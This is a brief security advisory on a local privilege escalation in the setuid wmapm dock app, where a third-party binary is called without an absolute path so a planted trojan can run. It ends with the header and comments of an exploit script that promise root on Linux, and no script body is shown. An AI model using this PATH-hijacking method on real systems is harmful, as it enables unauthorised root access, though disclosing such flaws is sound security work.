wmapm has been reported prone to a local privilege escalation vulnerability. The vulnerability has been conjectured to result from a lack of relative path usage while the vulnerable dock app is invoking a third party binary. As a result of this, a local attacker may manipulate local path settings and have the setuid wmapm dock app erroneously invoke a trojan binary that is located in a directory that the attacker has permissions to write to.

#/bin/sh
# Pretty useless, we can mess up /etc/dumpdates or run shutdown
# on FreeBSD systems with wmapm from ports.
# If wmapm is installed from source we get root instead,
# so I suppose this might be worth something(uid 0) on linux.
